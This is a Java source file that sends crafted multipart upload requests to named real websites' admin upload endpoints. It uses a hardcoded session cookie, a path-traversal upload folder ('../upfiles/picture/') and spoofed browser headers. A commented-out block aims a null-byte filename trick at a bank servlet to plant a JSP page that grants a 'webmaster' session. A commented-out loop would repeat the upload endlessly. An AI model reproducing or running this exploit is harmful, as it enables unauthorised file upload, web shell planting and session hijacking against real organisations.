package tea.update;

import java.io.*;
import java.net.*;

public class Up extends Thread
{

    public Up()
    {
    }

    public static int c = 0;
    public static void submit()
    {
        System.out.println(c++);
        String url = "http://www.cnooc.com.cn/job/fileupload/admin_upfile.asp";
        //"http://ea.cebbank.com/servlet/InsertPicture"
        //String str="-----------------------------7d8ac256081a\r\n"+
        //"Content-Disposition: form-data; name=\"community\"\r\n"+
        //"\r\n"+
        //"ceb\r\n"+
        //"-----------------------------7d8ac256081a\r\n"+
        //"Content-Disposition: form-data; name=\"node\"\r\n"+
        //"\r\n"+
        //"44868\r\n"+
        //"-----------------------------7d8ac256081a\r\n"+
        //"Content-Disposition: form-data; name=\"changepic\"\r\n"+
        //"\r\n"+
        //"\r\n"+
        //"-----------------------------7d8ac256081a\r\n"+
        //"Content-Disposition: form-data; name=\"picture\"; filename=\"X:\\edn\\ROOT\\index.jsp"+(char)0+"\"\r\n"+
        //"Content-Type: text/plain\r\n"+
        //"\r\n"+
        //"<"+"%\r\n"+
        //"session.setAttribute(\"user\",\"webmaster\");\r\n"+
        //"out.print(\"OK\");\r\n"+
        //"%"+">\r\n";
        //// /res/ceb/u/0809/080918238.jsp
        try
        {

            File f = new File("E:/in-1.jpg");
            byte by[] = new byte[(int) f.length()];
            FileInputStream fis = new FileInputStream(f);
            fis.read(by);
            fis.close();

            String str = "";
            str = str + "-----------------------------7d839929510308";
            str = str + "\r\nContent-Disposition: form-data; name=\"filepath\"\r\n\r\n";
            str = str + "../upfiles/picture/";
            str = str + "\r\n-----------------------------7d839929510308";
            str = str + "\r\nContent-Disposition: form-data; name=\"file1\"; filename=\"E:\\in-1.jpg\"";
            str = str + "\r\nContent-Type: image/pjpeg\r\n\r\n";

            byte by2[] = str.getBytes();
            URL u = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) u.openConnection();
            conn.setRequestProperty("Accept", "image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-shockwave-flash, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, */*");
            conn.setRequestProperty("Referer", url);
            conn.setRequestProperty("Accept-Language", "zh-cn");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=---------------------------7d839929510308");
            conn.setRequestProperty("Accept-Encoding", "gzip, deflate");
            conn.setRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 4.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)");
            conn.setRequestProperty("Host", u.getHost());
            conn.setRequestProperty("Content-Length", "" + 1); //by.length + by2.length + 151
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("Cache-Control", "no-cache");
            conn.setRequestProperty("Cookie", "ASPSESSIONIDCABTTSTT=IPKAKAGCLGACDEIMJEOCCIFG; ASPSESSIONIDACBTTSTT=AALAKAGCODGKKHNFMJNPFKHI");
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            OutputStream os = conn.getOutputStream();
            os.write(by2);
            os.write(by);
            str = "";
            str = str + "\r\n-----------------------------7d839929510308";
            str = str + "\r\nContent-Disposition: form-data; name=\"Submit\"\r\n\r\n";
            str = str + "上传";
            str = str + "\r\n-----------------------------7d833c33510308--\r\n";
            os.write(str.getBytes());
            os.close();

            InputStream is = conn.getInputStream();
            int l = 0;
            by = new byte[1024];
            while ((l = is.read(by)) != -1)
            {
                System.out.print(new String(by, 0, l, "GBK"));
            }
            is.close();
        } catch (IOException ex)
        {
            ex.printStackTrace();
        }
    }

    /*public static void main(String[] args)
    {
        while (true)
        {
            submit();
        }
    }*/
}
